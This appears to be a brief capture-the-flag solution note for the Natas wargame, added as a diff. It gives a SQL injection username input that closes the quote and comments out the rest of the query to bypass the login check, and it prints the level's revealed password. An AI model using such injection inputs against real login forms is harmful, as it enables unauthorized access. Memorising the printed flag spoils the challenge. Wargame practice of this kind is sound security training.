@@ -1,0 +1,10 @@
+username: natas15"; -- 
+password: */\
+
+
+SQL injection is possible due to poor quoting.
+
+We just need to close the quote of the username and comment out wit -- the rest of the query.
+
+
+Successful login! The password for natas15 is AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
